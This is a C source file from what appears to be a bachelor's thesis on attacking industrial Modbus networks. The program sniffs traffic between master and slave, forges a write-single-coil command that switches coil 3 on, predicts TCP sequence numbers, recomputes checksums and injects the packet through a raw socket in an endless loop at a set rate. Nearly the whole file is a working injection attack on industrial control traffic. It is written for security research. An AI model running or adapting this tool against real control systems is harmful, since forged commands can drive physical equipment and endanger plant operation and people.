// Solution for BACHELOR’S THESIS: atack generation on industrial modbus network
// File:        inject.c
// Author:      Jakub Kuzník, FIT
// Program sniffs tcp comunication between master and slave. It injects packets
//     into this communication. Communication we are looking for is defined in 
//     modbus-packet.h
// Execution: ./inject 10 .... means 10 packets/min 
//            ./inject 0  .... means full speed 

#include "inject.h"

int main(int argc, char **argv){

  // Modbus TCP packet
  modbusPacket *mPacket;
  char *packetRawForm;
  // raw sockete for sending packets
  int rawSocket;
  pcap_t *sniffInterface = NULL;
  char error_message[PCAP_ERRBUF_SIZE];
  srand(time(NULL)); // rand nums init.

  // count how many mili second should we wait between each injected packet 
  uint64_t waitMicroSec = parseArgs(argc, argv);
  
  // this function will create raw socket.
  // if there is an error it will exit() program
  rawSocket = createRawSocket();

  // open interface for sniffing // exit program if error
  // global variable in sniff.c
  sniffInterface = openInt(error_message, OUT_INTERFACE);

  // find packet and parse all its info
  // TODO can send every nth (slow it down)
  while (1){
    mPacket = findModbusPacket();

    // generate malicious packet (predict seq, ack nums) from existing
    generateMaliciousPacket(mPacket);

    int packet_size = ETH_HEADER_SIZE + IP_HEADER_SIZE + TCP_HEADER_SIZE + \
                      MODBUS_HEADER_SIZE + (ntohs(mPacket->modbusH.lenght) - 1);

    // prepare packet to send
    packetRawForm = packetToCharArray(packet_size, mPacket);

    // // count the crc
    // uint32_t crc = crc32(0L, Z_NULL, 0); // initialize CRC value
    // crc = crc32(crc, (const Bytef *)packetRawForm, packet_size);
    // // Append the CRC to the packet data
    // memcpy(packetRawForm + packet_size, &crc, sizeof(crc));
    // packet_size += sizeof(crc);

    //// debug packet raw data
    for (int i = 0; i < packet_size; i++){
      printf(" %02hhX", packetRawForm[i]);
    }
    printf("\n");
    usleep(waitMicroSec);

    // send the data over the raw socket
    write(rawSocket, packetRawForm, packet_size);
    free(packetRawForm);
    free(mPacket->modbusP.data);
    free(mPacket);
  }

  // close sniffing interface
  pcap_close(sniffInterface);
  return 0;
}

/**
 * @brief Create malicious packet from existing.
 */
void generateMaliciousPacket(modbusPacket *mPacket){
  // ref number -> 3
  // activate -> data -> FF
  // ack = ack + 48 == 4 write_single_coil packets
  // seq = seq + 48 == 4 write_single_coil packets

  // transaction id has to be unique
  mPacket->modbusH.transactionId = ntohs(random());

  // ref num 3
  mPacket->modbusP.data[0] = 0;
  mPacket->modbusP.data[1] = 3;

  // activate data
  mPacket->modbusP.data[2] = 0xff;

  mPacket->ipHeader.id = random();
  countIpChecksum(mPacket);

  mPacket->tcpHeader.seq = htonl(ntohl(mPacket->tcpHeader.seq) + 48);
  mPacket->tcpHeader.ack_seq = htonl(ntohl(mPacket->tcpHeader.ack_seq) + 48);
  mPacket->tcpHeader.check = 0;
  countTcpChecksum(mPacket);
}

/**
 * @brief count ip checksum for given packet
 */
void countIpChecksum(modbusPacket *mPacket)
{
  // checksum field is not in calculation 
  mPacket->ipHeader.check = 0;

  uint32_t result = 0;

  // inicialization of 16 bit value to ipHeader begining
  const uint16_t *buf = (const uint16_t *)&mPacket->ipHeader;
  // iterate throught ip header (+16bit one iteration)
  for (int i = 0; i < IP_HEADER_SIZE / 2; i++){
    result += buf[i];
  }

  // Add carry bits to sum
  // while there are some positive bits in upper 16bits
  // sum the upper part to the lower part
  while (result >> 16){
    result = (result & 0xFFFF) + (result >> 16);
  }

  // complement == negate all bits
  mPacket->ipHeader.check = (uint16_t)~result;
}

/**
 * @brief count tcp checksum for given packet
 */
void countTcpChecksum(modbusPacket *mPacket)
{
  // tcp header lenght in bytes + tcp payload
  int tcpLen = ntohs(mPacket->ipHeader.tot_len) - IP_HEADER_SIZE;
  uint16_t *data = prepareDataForChecksum(mPacket); // ip_pseudo:tcp_header:payload
  int dataLen = tcpLen + PH_SIZE;

  // for (int i = 0; i < dataLen; i++)
    // printf("%02x ", data[i]);
  // printf("\n");

  // Calculate the TCP checksum 
  uint32_t sum = 0;
  for (int i = 0; i < dataLen / 2; i++){
    sum += ntohs(data[i]);
  }

  // Add in any odd byte 
  if (dataLen % 2){
    sum += ((uint16_t)data[dataLen-1]) << 8;    
  }

  sum =  (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  sum = (uint16_t)(~sum);

  mPacket->tcpHeader.check = htons(sum);
  free(data);
}

/**
 * @brief concatenate pseudo header tcp header and payload
 */
char *prepareDataForChecksum(modbusPacket *mPacket){

  int tcpLen = ntohs(mPacket->ipHeader.tot_len) - IP_HEADER_SIZE;
  char *data = malloc(PH_SIZE + tcpLen);
  if (data == NULL){
    fprintf(stderr, "Malloc failed \n");
    exit(1);
  }
  char *pt = &data[0]; // pointer to first element of array

  // pseudo header
  memcpy(pt, &mPacket->ipHeader.saddr, 4);
  pt += 4;
  memcpy(pt, &mPacket->ipHeader.daddr, 4);
  pt += 4;
  *pt++ = 0;
  *pt++ = TCP;
  short tcpLenNBO = htons(tcpLen);
  memcpy(pt, &tcpLenNBO, 2);
  pt += 2;

  // TCP header + payload
  // tcp header
  memcpy(pt, &mPacket->tcpHeader, TCP_HEADER_SIZE); pt += TCP_HEADER_SIZE;
  // Modbus TCP header
  memcpy(pt, &mPacket->modbusH, MODBUS_HEADER_SIZE); pt += MODBUS_HEADER_SIZE;
  // Modbus payload
  memcpy(pt, &mPacket->modbusP, 1); pt += 1;
  memcpy(pt, &mPacket->modbusP.data[0], ntohs(mPacket->modbusH.lenght) -2);

  return data;
}

/**
 * @brief Set the Raw Socket object
 * @return socket or exit program
 */
int createRawSocket()
{

  int rawSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (rawSocket < 0)
  {
    fprintf(stderr, "Error can't create raw socket\n");
    exit(1);
  }

  // get index of network interface named "eno2"
  int ifIndex = if_nametoindex(OUT_INTERFACE);
  if (ifIndex == 0)
  {
    fprintf(stderr, "Can't get network interface index");
    exit(1);
  }

  // bind socket to network interface
  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_family = AF_PACKET;
  sa.sll_protocol = htons(ETH_P_ALL);
  sa.sll_ifindex = ifIndex;
  if (bind(rawSocket, (struct sockaddr *)&sa, sizeof(sa)) < 0)
  {
    fprintf(stderr, "Can't bind socket to interface");
    exit(1);
  }

  return rawSocket;
}

/**
 * @brief Parse arguments. It count how many micro sec should we 
 *   wait between each packet 
 */
uint64_t parseArgs(int argc, char **argv){

  if (argc != 2){
    // Execution: ./inject 10 .... means 10 packets/s 
    //            ./inject 0  .... means full speed 
    fprintf(stderr, "Bad execution.\n");
    fprintf(stderr, "try:\n");
    fprintf(stderr, " ./inject 10 ... means 10 packets/min.\n");
    fprintf(stderr, " ./inject 0  ... means full speed.\n");
    exit(1);
  }
  
  char *endptr;
  uint64_t packetsPS = strtoull(argv[1], &endptr, 10);
  if (*endptr){
    fprintf(stderr, "argument not an number\n");
    exit(1);
  }

  // full speed 
  if (packetsPS == 0)
    return 0; 

  // 1min / packetsPS 
  return (uint64_t) (60000000 / packetsPS);
  

}
